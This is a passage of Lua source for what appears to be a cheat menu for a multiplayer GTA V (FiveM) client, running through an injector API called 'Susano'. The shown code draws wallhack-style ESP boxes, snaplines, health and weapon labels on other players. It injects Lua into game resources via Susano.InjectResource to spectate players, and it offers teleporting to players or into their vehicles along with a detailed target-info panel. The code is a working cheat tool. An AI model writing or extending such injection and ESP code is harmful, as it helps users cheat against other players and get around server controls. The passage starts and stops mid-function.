            ESPCache[footCacheKey] = {x = footX, y = footY, time = currentTime}
        end
        
        -- VÃ©rifier que les coordonnÃ©es sont valides avant de calculer la box
        if not headX or not headY or not footX or not footY then return end
        
        local height = math.abs(headY - footY)
        if height < 0.01 then return end -- Ã‰viter les boxes trop petites
        
        local width = height * 0.35 -- Thinner box (was 0.5)
        
        local boxX1 = headX - width * 0.5
        local boxX2 = headX + width * 0.5
        local boxY1 = headY
        local boxY2 = footY
        
        -- Fix Y order if inverted
        if boxY1 > boxY2 then boxY1, boxY2 = boxY2, boxY1 end

        -- Box (optimisÃ© - vÃ©rifier que la box est valide)
        if drawBox and boxX1 and boxX2 and boxY1 and boxY2 then
            -- Draw thin black outline
            Draw2DBox(boxX1 - 0.0005, boxY1 - 0.0005, boxX2 + 0.0005, boxY2 + 0.0005, 0.0, 0.0, 0.0, 1.0, screenW, screenH)
            -- Draw main box
            Draw2DBox(boxX1, boxY1, boxX2, boxY2, boxColor[1], boxColor[2], boxColor[3], 1.0, screenW, screenH)
        end
        
        -- Snapline (optimisÃ© - vÃ©rifier que footX et footY sont valides)
        if drawLine and Susano.DrawLine and footX and footY then
             Susano.DrawLine(screenW / 2, screenH, footX * screenW, footY * screenH, lineColor[1], lineColor[2], lineColor[3], 1.0, 1)
        end
        
        -- Info Text Buckets
        -- 2=Top, 3=Bottom, 4=Left, 5=Right
        local textBuckets = { [2] = "", [3] = "", [4] = "", [5] = "" }
        
        local function AddToBucket(sel, text)
            if sel > 1 and textBuckets[sel] then
                textBuckets[sel] = textBuckets[sel] .. text .. "\n"
            end
        end
        
        if drawName then AddToBucket(drawNamePos + 1, GetPlayerName(playerIdx)) end
        if drawID then AddToBucket(drawIDPos + 1, "ID: " .. GetPlayerServerId(playerIdx)) end
        if drawDist then AddToBucket(drawDistPos + 1, math.floor(dist) .. "m") end
        if drawWeapon then
             local _, weaponHash = GetCurrentPedWeapon(targetPed, true)
             local weaponName = GetWeaponNameFromHash(weaponHash)
             -- GetWeaponNameFromHash retourne dÃ©jÃ  "Unarmed" pour WEAPON_UNARMED
             AddToBucket(drawWeaponPos + 1, weaponName)
        end
        
        if Susano.DrawText then
            local function DrawTextWithOutline(x, y, text, size, r, g, b, a)
                -- Draw black outline (8 directions)
                Susano.DrawText(x - 1, y - 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Top-left
                Susano.DrawText(x, y - 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Top
                Susano.DrawText(x + 1, y - 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Top-right
                Susano.DrawText(x - 1, y, text, size, 0.0, 0.0, 0.0, 1.0) -- Left
                Susano.DrawText(x + 1, y, text, size, 0.0, 0.0, 0.0, 1.0) -- Right
                Susano.DrawText(x - 1, y + 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Bottom-left
                Susano.DrawText(x, y + 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Bottom
                Susano.DrawText(x + 1, y + 1, text, size, 0.0, 0.0, 0.0, 1.0) -- Bottom-right
                -- Draw main text
                Susano.DrawText(x, y, text, size, r, g, b, a)
            end
            
            -- Top (Centered above box)
            if textBuckets[2] ~= "" and boxX1 and boxX2 and boxY1 then
                local textX = (boxX1 + boxX2)/2 * screenW
                local textY = boxY1 * screenH - 15
                DrawTextWithOutline(textX, textY, textBuckets[2], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end
            
            -- Bottom (Centered below box)
            if textBuckets[3] ~= "" and boxX1 and boxX2 and boxY2 then
                local textX = (boxX1 + boxX2)/2 * screenW
                local textY = boxY2 * screenH + 5
                DrawTextWithOutline(textX, textY, textBuckets[3], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end
            
            -- Left (Right of boxX1? No, Left of boxX1)
            if textBuckets[4] ~= "" and boxX1 and boxY1 then
                local textX = boxX1 * screenW - 50
                local textY = boxY1 * screenH
                DrawTextWithOutline(textX, textY, textBuckets[4], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end
            
            -- Right (Right of boxX2)
            if textBuckets[5] ~= "" and boxX2 and boxY1 then
                local textX = boxX2 * screenW + 5
                local textY = boxY1 * screenH
                DrawTextWithOutline(textX, textY, textBuckets[5], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end
        end
        
        -- Health & Armor Bars (optimisÃ© - vÃ©rifier que la box est valide)
        if (drawHealth or drawArmor) and boxX1 and boxY1 and boxY2 then
            local barW = 2 -- Thinner bar
            
            if drawHealth then
                local health = GetEntityHealth(targetPed)
                local maxHealth = GetEntityMaxHealth(targetPed)
                local healthPct = (health - 100) / (maxHealth - 100)
                if healthPct < 0 then healthPct = 0 end
                if healthPct > 1 then healthPct = 1 end
                
                local barH = (boxY2 - boxY1) * screenH
                if barH > 0 then
                    local barX = (boxX1 * screenW) - (barW + 2)
                    local barY = boxY1 * screenH
                    
                    -- Outline (Black, larger)
                    DrawFilledRect(barX - 1, barY - 1, barW + 2, barH + 2, 0.0, 0.0, 0.0, 1.0)
                    
                    -- Fill (Green)
                    local fillH = barH * healthPct
                    DrawFilledRect(barX, barY + (barH - fillH), barW, fillH, 0.0, 1.0, 0.0, 1.0)
                end
            end
            
            if drawArmor then
                local armor = GetPedArmour(targetPed)
                local armorPct = armor / 100.0
                if armorPct > 1 then armorPct = 1 end
                
                if armorPct > 0 then
                    local barH = (boxY2 - boxY1) * screenH
                    if barH > 0 then
                        -- Position: Left of health bar (if health is on) or Left of box
                        local offset = (barW + 2)
                        if drawHealth then offset = offset + (barW + 2) end
                        
                        local barX = (boxX1 * screenW) - offset
                        local barY = boxY1 * screenH
                        
                        -- Outline
                        DrawFilledRect(barX - 1, barY - 1, barW + 2, barH + 2, 0.0, 0.0, 0.0, 1.0)
                        
                        -- Fill (Blue)
                        local fillH = barH * armorPct
                        DrawFilledRect(barX, barY + (barH - fillH), barW, fillH, 0.0, 0.0, 1.0, 1.0)
                    end
                end
            end
        end
    end
end

local function GetWorldSettings()
    local settings = {}
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Visual" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "World" and tab.items then
                    for _, item in ipairs(tab.items) do
                        settings[item.name] = item
                    end
                end
            end
        end
    end
    return settings
end

local worldSettings = nil

local function RenderWorldVisuals(settings)
    if not settings then return end

    Actions.fpsBoostItem = settings["FPS Boost"]
    if Actions.fpsBoostItem and Actions.fpsBoostItem.value then
        if OverrideLodscaleThisFrame then OverrideLodscaleThisFrame(0.35) end
        if SetDisableDecalRenderingThisFrame then SetDisableDecalRenderingThisFrame() end
        
        if Menu.RopeDrawShadowEnabled then Menu.RopeDrawShadowEnabled(false) end
        if CascadeShadowsClearShadow then CascadeShadowsClearShadow() end
        
        if SetReducePedModelBudget then SetReducePedModelBudget(true) end
        if SetReduceVehicleModelBudget then SetReduceVehicleModelBudget(true) end
        if DisableVehicleDistantlights then DisableVehicleDistantlights(true) end
        if SetDeepOceanScaler then SetDeepOceanScaler(0.0) end
        if SetGrassCullDistanceScale then SetGrassCullDistanceScale(0.0) end
    else
        if Menu.RopeDrawShadowEnabled then Menu.RopeDrawShadowEnabled(true) end
        if SetReducePedModelBudget then SetReducePedModelBudget(false) end
        if SetReduceVehicleModelBudget then SetReduceVehicleModelBudget(false) end
        if DisableVehicleDistantlights then DisableVehicleDistantlights(false) end
        if SetDeepOceanScaler then SetDeepOceanScaler(1.0) end
        if SetGrassCullDistanceScale then SetGrassCullDistanceScale(1.0) end
    end

    Actions.timeItem = settings["Time"]
    Actions.freezeItem = settings["Freeze Time"]

    if Actions.freezeItem and Actions.freezeItem.value then
        if Actions.timeItem then
            NetworkOverrideClockTime(math.floor(Actions.timeItem.value), 0, 0)
        end
    end
    
    Actions.weatherItem = settings["Weather"]
    if Actions.weatherItem and Actions.weatherItem.options then
        local selectedWeather = Actions.weatherItem.options[Actions.weatherItem.selected]
        if selectedWeather then
             SetWeatherTypeNowPersist(selectedWeather)
        end
    end
    
    Actions.blackoutItem = settings["Blackout"]
    if Actions.blackoutItem then
        SetBlackout(Actions.blackoutItem.value)
    end
end

local function FindItem(categoryName, tabName, itemName)
    if not Menu or not Menu.Categories or type(Menu.Categories) ~= "table" then
        return nil
    end
    
    local success, result = pcall(function()
        for _, cat in ipairs(Menu.Categories) do
            if cat and type(cat) == "table" and cat.name == categoryName then
                if cat.tabs and type(cat.tabs) == "table" then
                    for _, tab in ipairs(cat.tabs) do
                        if tab and type(tab) == "table" and tab.name == tabName and tab.items and type(tab.items) == "table" then
                            for _, item in ipairs(tab.items) do
                                if item and type(item) == "table" and item.name == itemName then 
                                    return item 
                                end
                            end
                        end
                    end
                elseif cat.items and type(cat.items) == "table" and (tabName == nil or tabName == "") then
                    for _, item in ipairs(cat.items) do
                        if item and type(item) == "table" and item.name == itemName then 
                            return item 
                        end
                    end
                end
            end
        end
        return nil
    end)
    
    if success then
        return result
    else
        print("FindItem error: " .. tostring(result))
        return nil
    end
end

local lastNoclipSpeed = 1.0
local noclipType = "normal"

local spectateActive = false
local spectateCamera = nil

local function ToggleSpectate(enable)
    if enable then
        if not Menu.SelectedPlayer then
            Menu.PlayerListSpectateEnabled = false
            return
        end
        
        spectateActive = true
        local targetServerId = Menu.SelectedPlayer
        
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                local targetServerId = %d
                local spectateThreadActive = true
                local playerPed = PlayerPedId()
                
                CreateThread(function()
                    while spectateThreadActive do
                        Wait(0)
                        
                        local targetPlayerId = nil
                        for _, player in ipairs(GetActivePlayers()) do
                            if GetPlayerServerId(player) == targetServerId then
                                targetPlayerId = player
                                break
                            end
                        end
                        
                        if targetPlayerId then
                            local targetPed = GetPlayerPed(targetPlayerId)
                            if DoesEntityExist(targetPed) then
                                NetworkSetInSpectatorMode(true, targetPed)
                            else
                                spectateThreadActive = false
                                NetworkSetInSpectatorMode(false, playerPed)
                                break
                            end
                        else
                            spectateThreadActive = false
                            NetworkSetInSpectatorMode(false, playerPed)
                            break
                        end
                    end
                    
                    NetworkSetInSpectatorMode(false, playerPed)
                end)
                
                rawset(_G, 'spectate_thread_active_' .. targetServerId, function()
                    spectateThreadActive = false
                    NetworkSetInSpectatorMode(false, playerPed)
                end)
            ]], targetServerId))
        end
    else
        spectateActive = false
        Menu.PlayerListSpectateEnabled = false
        
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetServerId = Menu.SelectedPlayer
            if targetServerId then
                Susano.InjectResource("any", string.format([[
                    local stopFunction = rawget(_G, 'spectate_thread_active_' .. %d)
                    if stopFunction then
                        stopFunction()
                        rawset(_G, 'spectate_thread_active_' .. %d, nil)
                    end
                    NetworkSetInSpectatorMode(false, PlayerPedId())
                ]], targetServerId, targetServerId))
            else
                Susano.InjectResource("any", [[
                    NetworkSetInSpectatorMode(false, PlayerPedId())
                ]])
            end
        end
    end
end

local function UpdatePlayerList()
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Online" and cat.tabs then
            for tabIdx, tab in ipairs(cat.tabs) do
                if tab.name == "Player List" then
                    for _, item in ipairs(tab.items) do
                        if item.type == "selector" then
                            if item.name == "Select" then
                                Menu.PlayerListSelectIndex = item.selected or 1
                            elseif item.name == "Teleport" then
                                Menu.PlayerListTeleportIndex = item.selected or 1
                            end
                        elseif item.type == "toggle" and item.name == "Spectate Player" then
                            Menu.PlayerListSpectateEnabled = item.value or false
                        end
                    end
                    
                    tab.items = {}
                    
                    Actions.spectateItem = {
                        name = "Spectate Player",
                        type = "toggle",
                        value = Menu.PlayerListSpectateEnabled
                    }
                    Actions.spectateItem.onClick = function(value)
                        Menu.PlayerListSpectateEnabled = value
                        ToggleSpectate(value)
                    end
                    table.insert(tab.items, Actions.spectateItem)
                    
                    Actions.teleportItem = {
                        name = "Teleport",
                        type = "selector",
                        options = {"To Player", "Into Vehicle"},
                        selected = Menu.PlayerListTeleportIndex
                    }
                    Actions.teleportItem.onClick = function(index, option)
                        if not Menu.SelectedPlayer then return end
                        
                        if index == 1 then
                            for _, player in ipairs(GetActivePlayers()) do
                                if GetPlayerServerId(player) == Menu.SelectedPlayer then
                                    local targetPed = GetPlayerPed(player)
                                    if DoesEntityExist(targetPed) then
                                        local coords = GetEntityCoords(targetPed)
                                        SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z)
                                    end
                                    break
                                end
                            end
                        elseif index == 2 then
                            for _, player in ipairs(GetActivePlayers()) do
                                if GetPlayerServerId(player) == Menu.SelectedPlayer then
                                    local targetPed = GetPlayerPed(player)
                                    if DoesEntityExist(targetPed) then
                                        local vehicle = GetVehiclePedIsIn(targetPed, false)
                                        if vehicle and vehicle ~= 0 then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -2)
                                        end
                                    end
                                    break
                                end
                            end
                        end
                    end
                    table.insert(tab.items, Actions.teleportItem)
                    
                    local localPed = PlayerPedId()
                    if not localPed or localPed == 0 then return end
                    
                    local localCoords = GetEntityCoords(localPed)
                    local myPlayerId = PlayerId()
                    local myServerId = GetPlayerServerId(myPlayerId)
                    local myName = GetPlayerName(myPlayerId)
                    
                    local otherPlayers = {}
                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= myPlayerId then
                            local targetPed = GetPlayerPed(player)
                            if targetPed and DoesEntityExist(targetPed) then
                                local targetCoords = GetEntityCoords(targetPed)
                                local distance = #(localCoords - targetCoords)
                                
                                local playerId = GetPlayerServerId(player)
                                local playerName = GetPlayerName(player)
                                table.insert(otherPlayers, {
                                    id = playerId,
                                    name = playerName,
                                    distance = math.floor(distance)
                                })
                            end
                        end
                    end
                    
                    table.sort(otherPlayers, function(a, b) return a.distance < b.distance end)
                    
                    Actions.selectModeItem = {
                        name = "Select",
                        type = "selector",
                        options = {"Select All", "Unselect All"},
                        selected = Menu.PlayerListSelectIndex
                    }
                    Actions.selectModeItem.onClick = function(index, option)
                        if index == 1 then
                            Menu.SelectedPlayers = {}
                            table.insert(Menu.SelectedPlayers, myServerId)
                            Menu.SelectedPlayer = myServerId
                            for _, playerData in ipairs(otherPlayers) do
                                table.insert(Menu.SelectedPlayers, playerData.id)
                            end
                        elseif index == 2 then
                            Menu.SelectedPlayer = nil
                            Menu.SelectedPlayers = {}
                        end
                    end
                    table.insert(tab.items, Actions.selectModeItem)
                    
                    table.insert(tab.items, {
                        name = "",
                        isSeparator = true,
                        separatorText = "Player List"
                    })
                    
                    local function isPlayerSelected(playerId)
                        for _, selectedId in ipairs(Menu.SelectedPlayers) do
                            if selectedId == playerId then
                                return true
                            end
                        end
                        return false
                    end
                    
                    local function togglePlayerSelection(playerId)
                        local found = false
                        for i, selectedId in ipairs(Menu.SelectedPlayers) do
                            if selectedId == playerId then
                                table.remove(Menu.SelectedPlayers, i)
                                found = true
                                break
                            end
                        end
                        if not found then
                            table.insert(Menu.SelectedPlayers, playerId)
                            Menu.SelectedPlayer = playerId
                        else
                            if Menu.SelectedPlayer == playerId then
                                Menu.SelectedPlayer = Menu.SelectedPlayers[1] or nil
                            end
                        end
                    end
                    
                    local selfToggle = {
                        name = myName .. " (You)",
                        type = "toggle",
                        value = isPlayerSelected(myServerId),
                        playerId = myServerId,
                        isSelf = true
                    }
                    selfToggle.onClick = function(value)
                        togglePlayerSelection(selfToggle.playerId)
                    end
                    table.insert(tab.items, selfToggle)
                    
                    for _, playerData in ipairs(otherPlayers) do
                        local playerToggle = {
                            name = playerData.name .. " (" .. playerData.distance .. "m)",
                            type = "toggle",
                            value = isPlayerSelected(playerData.id),
                            playerId = playerData.id
                        }
                        playerToggle.onClick = function(value)
                            togglePlayerSelection(playerToggle.playerId)
                        end
                        table.insert(tab.items, playerToggle)
                    end
                    
                    return
                end
            end
        end
    end
end

Citizen.CreateThread(function()
    Wait(500)
    while true do
        UpdatePlayerList()
        Wait(0)
    end
end)

Menu.OnRender = function()
    if not worldSettings then worldSettings = GetWorldSettings() end
    RenderWorldVisuals(worldSettings)
    -- Draw player info panel when a player is selected
    if Menu.Visible and Menu.SelectedPlayer then
        Menu.DrawPlayerInfoPanel()
    end
end

-- ============================================
-- PLAYER INFO PANEL (Draw API, style = menu)
-- ============================================

local _weaponNameCache = {}
local function getWeaponName(weaponHash)
    if _weaponNameCache[weaponHash] then return _weaponNameCache[weaponHash] end
    local map = {
        ["WEAPON_RAILGUN"] = "Railgun", ["WEAPON_ASSAULTSHOTGUN"] = "Assault Shotgun",
        ["WEAPON_SMG"] = "SMG", ["WEAPON_FIREWORK"] = "Firework Launcher",
        ["WEAPON_MOLOTOV"] = "Molotov", ["WEAPON_APPISTOL"] = "AP Pistol",
        ["WEAPON_STUNGUN"] = "Stun Gun", ["WEAPON_ASSAULTRIFLE"] = "Assault Rifle",
        ["WEAPON_ASSAULTRIFLE_MK2"] = "Assault Rifle MK2", ["WEAPON_ASSAULTSMG"] = "Assault SMG",
        ["WEAPON_AUTOSHOTGUN"] = "Auto Shotgun", ["WEAPON_BULLPUPRIFLE"] = "Bullpup Rifle",
        ["WEAPON_BULLPUPRIFLE_MK2"] = "Bullpup Rifle MK2", ["WEAPON_BULLPUPSHOTGUN"] = "Bullpup Shotgun",
        ["WEAPON_CARBINERIFLE"] = "Carbine Rifle", ["WEAPON_CARBINERIFLE_MK2"] = "Carbine Rifle MK2",
        ["WEAPON_COMBATMG"] = "Combat MG", ["WEAPON_COMBATMG_MK2"] = "Combat MG MK2",
        ["WEAPON_COMBATPDW"] = "Combat PDW", ["WEAPON_COMBATPISTOL"] = "Combat Pistol",
        ["WEAPON_COMPACTLAUNCHER"] = "Compact Launcher", ["WEAPON_COMPACTRIFLE"] = "Compact Rifle",
        ["WEAPON_DBSHOTGUN"] = "DB Shotgun", ["WEAPON_DOUBLEACTION"] = "Double Action",
        ["WEAPON_GRENADE"] = "Grenade", ["WEAPON_GUSENBERG"] = "Gusenberg",
        ["WEAPON_HEAVYPISTOL"] = "Heavy Pistol", ["WEAPON_HEAVYSHOTGUN"] = "Heavy Shotgun",
        ["WEAPON_HEAVYSNIPER"] = "Heavy Sniper", ["WEAPON_HEAVYSNIPER_MK2"] = "Heavy Sniper MK2",
        ["WEAPON_HOMINGLAUNCHER"] = "Homing Launcher", ["WEAPON_MACHINEPISTOL"] = "Machine Pistol",
        ["WEAPON_MARKSMANPISTOL"] = "Marksman Pistol", ["WEAPON_MARKSMANRIFLE"] = "Marksman Rifle",
        ["WEAPON_MARKSMANRIFLE_MK2"] = "Marksman Rifle MK2", ["WEAPON_MG"] = "MG",
        ["WEAPON_MICROSMG"] = "Micro SMG", ["WEAPON_MINIGUN"] = "Minigun",
        ["WEAPON_MINISMG"] = "Mini SMG", ["WEAPON_MUSKET"] = "Musket",
        ["WEAPON_NAVYREVOLVER"] = "Navy Revolver", ["WEAPON_PISTOL"] = "Pistol",
        ["WEAPON_PISTOL50"] = "Pistol .50", ["WEAPON_PISTOL_MK2"] = "Pistol MK2",
        ["WEAPON_PUMPSHOTGUN"] = "Pump Shotgun", ["WEAPON_PUMPSHOTGUN_MK2"] = "Pump Shotgun MK2",
        ["WEAPON_RAYCARBINE"] = "Ray Carbine", ["WEAPON_RAYMINIGUN"] = "Ray Minigun",
        ["WEAPON_RAYPISTOL"] = "Ray Pistol", ["WEAPON_REVOLVER"] = "Revolver",
        ["WEAPON_REVOLVER_MK2"] = "Revolver MK2", ["WEAPON_SAWNOFFSHOTGUN"] = "Sawed-Off",
        ["WEAPON_RPG"] = "RPG", ["WEAPON_SMG_MK2"] = "SMG MK2",
        ["WEAPON_SNIPERRIFLE"] = "Sniper Rifle", ["WEAPON_SNSPISTOL"] = "SNS Pistol",
        ["WEAPON_SNSPISTOL_MK2"] = "SNS Pistol MK2", ["WEAPON_SPECIALCARBINE"] = "Special Carbine",
        ["WEAPON_SPECIALCARBINE_MK2"] = "Special Carbine MK2", ["WEAPON_STICKYBOMB"] = "Sticky Bomb",
        ["WEAPON_VINTAGEPISTOL"] = "Vintage Pistol", ["WEAPON_SWITCHBLADE"] = "Switchblade",
        ["WEAPON_NIGHTSTICK"] = "Nightstick", ["WEAPON_KNIFE"] = "Knife",
        ["WEAPON_BAT"] = "Bat", ["WEAPON_HAMMER"] = "Hammer", ["WEAPON_CROWBAR"] = "Crowbar",
        ["WEAPON_WRENCH"] = "Wrench", ["WEAPON_BATTLEAXE"] = "Battle Axe",
        ["WEAPON_DAGGER"] = "Dagger", ["WEAPON_HATCHET"] = "Hatchet",
        ["WEAPON_MACHETE"] = "Machete", ["WEAPON_FLASHLIGHT"] = "Flashlight",
        ["WEAPON_PIPEBOMB"] = "Pipe Bomb", ["WEAPON_PROXMINE"] = "Proximity Mine",
        ["WEAPON_BZGAS"] = "BZ Gas", ["WEAPON_SMOKEGRENADE"] = "Smoke Grenade",
        ["WEAPON_SNOWBALL"] = "Snowball", ["WEAPON_FLARE"] = "Flare",
        ["WEAPON_FLAREGUN"] = "Flare Gun", ["WEAPON_POOLCUE"] = "Pool Cue",
        ["WEAPON_FIREEXTINGUISHER"] = "Extinguisher",
    }
    for name, label in pairs(map) do
        local h = GetHashKey(name)
        _weaponNameCache[h] = label
    end
    return _weaponNameCache[weaponHash] or "Unknown"
end

local function ResolveLocalId(serverId)
    for _, p in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(p) == serverId then
            return p
        end
    end
    return nil
end

-- Collect all relevant player info
function Menu.GetSelectedPlayerInfo()
    local serverId = Menu.SelectedPlayer
    if not serverId then return nil end

    local localId = ResolveLocalId(serverId)
    if not localId then return nil end

    local playerPed = GetPlayerPed(localId)
    if not playerPed or playerPed == 0 or not DoesEntityExist(playerPed) then return nil end

    -- Weapon
    local weaponHash = GetSelectedPedWeapon(playerPed)
    local weaponName = "Unarmed"
    if weaponHash ~= GetHashKey("WEAPON_UNARMED") then
        weaponName = getWeaponName(weaponHash)
    end

    -- Vehicle
    local vehicle = GetVehiclePedIsIn(playerPed, false)
    local vehicleName = "On Foot"
    local speed = 0
    local vehPlate = ""
    local vehHealth = 0
    local vehMaxHealth = 0
    local inVehicle = false
    if vehicle ~= 0 then
        inVehicle = true
        vehicleName = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)) or "Unknown"
        speed = math.floor(GetEntitySpeed(vehicle) * 3.6)
        vehPlate = GetVehicleNumberPlateText(vehicle) or ""
        vehHealth = GetEntityHealth(vehicle)
        vehMaxHealth = GetEntityMaxHealth(vehicle)
    end

    -- Coords / Distance / Heading
    local myCoords = GetEntityCoords(PlayerPedId())
    local targetCoords = GetEntityCoords(playerPed)
    local distance = math.floor(#(myCoords - targetCoords))
    local heading = math.floor(GetEntityHeading(playerPed))

    -- Health / Armor
    local health = GetEntityHealth(playerPed)
    local maxHealth = GetEntityMaxHealth(playerPed)
    local armor = GetPedArmour(playerPed)
    local isAlive = health > 0

    -- States
    local isAiming = IsPlayerFreeAiming(localId)
    local isInCover = IsPedInCover(playerPed, false)
    local isSprinting = IsPedSprinting(playerPed)
    local isSwimming = IsPedSwimming(playerPed)
    local isFalling = IsPedFalling(playerPed)
    local isRagdoll = IsPedRagdoll(playerPed)
    local isInvisible = not IsEntityVisible(playerPed)

    -- God mode detection (invincible flag)
    local isGodmode = GetPlayerInvincible(localId)

    return {
        name = GetPlayerName(localId) or "Unknown",
        serverId = serverId,
        localId = localId,
        health = health,
        maxHealth = maxHealth,
        armor = armor,
        weapon = weaponName,
        vehicle = vehicleName,
        speed = speed,
        distance = distance,
        heading = heading,
        coords = targetCoords,
        isAlive = isAlive,
        inVehicle = inVehicle,
        vehPlate = vehPlate,
        vehHealth = vehHealth,
        vehMaxHealth = vehMaxHealth,
        isAiming = isAiming,
        isInCover = isInCover,
        isSprinting = isSprinting,
        isSwimming = isSwimming,
        isFalling = isFalling,
        isRagdoll = isRagdoll,
        isInvisible = isInvisible,
        isGodmode = isGodmode
    }
end

-- Utility: draw a rounded-rect panel matching menu style
-- Outer border: 0.216 gray | Inner bg: 0.059 dark | Alpha: 0.98 | Radius: 6
local function DrawPanelBackground(px, py, pw, ph, radius)
    radius = radius or 6
    if Susano and Susano.DrawRectFilled then
        -- Outer border (same as menu header border)
        Susano.DrawRectFilled(px, py, pw, ph, 0.216, 0.216, 0.216, 0.98, radius)
        -- Inner fill (same as menu body)
        Susano.DrawRectFilled(px + 1, py + 1, pw - 2, ph - 2, 0.059, 0.059, 0.059, 0.98, radius)
    else
        Menu.DrawRoundedRect(px, py, pw, ph, 55, 55, 55, 250, radius)
        Menu.DrawRoundedRect(px + 1, py + 1, pw - 2, ph - 2, 15, 15, 15, 250, radius)
    end
end

-- Utility: draw a health/armor style bar with rounded ends
local function DrawInfoBar(bx, by, bw, bh, pct, fillR, fillG, fillB, label, radius)
    radius = radius or 3
    pct = math.max(0, math.min(1, pct))
    -- Bar track
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(bx, by, bw, bh, 0.16, 0.16, 0.16, 0.9, radius)
    else
        Menu.DrawRect(bx, by, bw, bh, 40, 40, 40, 230)
    end
    -- Bar fill
    if pct > 0 then
        local fillW = math.max(radius * 2, math.floor(bw * pct))
        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(bx, by, fillW, bh, fillR / 255, fillG / 255, fillB / 255, 0.95, radius)
        else
            Menu.DrawRect(bx, by, fillW, bh, fillR, fillG, fillB, 242)
        end
    end
    -- Bar text
    if label then
        Menu.DrawText(bx + 5, by + 1, label, 11, 1.0, 1.0, 1.0, 0.95)
    end
end

-- Draw section separator line
local function DrawSectionSep(sx, sy, sw, text, scale, accent)
    -- Dim line
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(sx, sy + 8 * scale, sw, 1, 0.25, 0.25, 0.25, 0.5, 0)
    else
        Menu.DrawRect(sx, sy + 8 * scale, sw, 1, 64, 64, 64, 128)
    end
    if text then
        Menu.DrawText(sx, sy, text, 11, accent.r / 255, accent.g / 255, accent.b / 255, 0.8)
    end
    return sy + 18 * scale
end

function Menu.DrawPlayerInfoPanel()
    local info = Menu.GetSelectedPlayerInfo()
    if not info then return end

    local scale = Menu.Scale or 1.0
    local sp = Menu.GetScaledPosition()
    local accent = Menu.Colors.SelectedBg or { r = 104, g = 168, b = 203 }

    -- Compute exact menu total height (banner to footer bottom)
    local menuTotalH
    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if category and category.hasTabs and category.tabs then
            local currentTab = category.tabs[Menu.CurrentTab]
            local visibleItems = 0
            if currentTab and currentTab.items then
                visibleItems = math.min(Menu.ItemsPerPage, #currentTab.items)
            end
            menuTotalH = sp.headerHeight + (sp.headerSpacing or 0) + sp.mainMenuHeight + sp.mainMenuSpacing + (visibleItems * sp.itemHeight) + sp.footerSpacing + sp.footerHeight
        else
            menuTotalH = sp.headerHeight + (sp.headerSpacing or 0) + sp.mainMenuHeight + sp.mainMenuSpacing + sp.footerSpacing + sp.footerHeight
        end
    else
        local totalCats = #Menu.Categories - 1
        local visCats = math.min(Menu.ItemsPerPage, totalCats)
        menuTotalH = sp.headerHeight + (sp.headerSpacing or 0) + (visCats * sp.itemHeight) + sp.footerSpacing + sp.footerHeight
    end

    -- Panel position: right of menu, same Y, same height
    local gap = 12 * scale
    local panelX = sp.x + sp.width + gap
    local panelW = 310 * scale
    local panelY = sp.y
    local panelH = menuTotalH

    local pad = 14 * scale
    local rowH = 22 * scale
    local barH = 14 * scale
    local fontSize = 13
    local headerFontSize = 16

    local cx = panelX + pad
    local contentW = panelW - pad * 2
    local labelW = 95 * scale
    local valX = cx + labelW

    -- === BACKGROUND (matches menu: outer border + inner fill, rounded) ===
    DrawPanelBackground(panelX, panelY, panelW, panelH, 6)

    -- Start content below top padding
    local cy = panelY + pad

    -- =====================
    --  HEADER: Nom + ID
    -- =====================
    Menu.DrawText(cx, cy, info.name, headerFontSize, accent.r / 255, accent.g / 255, accent.b / 255, 1.0)

    local idText = "ID: " .. tostring(info.serverId)
    if Susano and Susano.GetTextWidth then
        local tw = Susano.GetTextWidth(idText, fontSize * scale)
        Menu.DrawText(panelX + panelW - pad - tw, cy + 2 * scale, idText, fontSize, 0.45, 0.45, 0.45, 1.0)
    else
        Menu.DrawText(panelX + panelW - pad - 55 * scale, cy + 2 * scale, idText, fontSize, 0.45, 0.45, 0.45, 1.0)
    end
    cy = cy + 26 * scale

    -- Helper: draw a label:value row
    local function Row(label, value, vR, vG, vB)
        vR = vR or 1.0; vG = vG or 1.0; vB = vB or 1.0
        Menu.DrawText(cx, cy, label, fontSize, 0.50, 0.50, 0.50, 1.0)
        Menu.DrawText(valX, cy, tostring(value), fontSize, vR, vG, vB, 1.0)
        cy = cy + rowH
    end

    -- =====================
    --  SANTE & ARMURE
    -- =====================
    cy = DrawSectionSep(cx, cy, contentW, "", scale, accent)

    -- Sante
    Menu.DrawText(cx, cy, "Sante", fontSize, 0.55, 0.55, 0.55, 1.0)
    local healthPct = 0
    if info.maxHealth > 0 then
        healthPct = math.max(0, math.min(1, info.health / info.maxHealth))
    end
    local healthPctText = tostring(math.floor(healthPct * 100)) .. "%"
    if Susano and Susano.GetTextWidth then
        local tw = Susano.GetTextWidth(healthPctText, fontSize * scale)
        Menu.DrawText(panelX + panelW - pad - tw, cy, healthPctText, fontSize, 0.7, 0.7, 0.7, 1.0)
    else
        Menu.DrawText(panelX + panelW - pad - 30 * scale, cy, healthPctText, fontSize, 0.7, 0.7, 0.7, 1.0)
    end
    cy = cy + rowH * 0.65

    local hR, hG, hB = 76, 175, 80
    if healthPct < 0.25 then hR, hG, hB = 211, 64, 60
    elseif healthPct < 0.55 then hR, hG, hB = 230, 160, 40 end
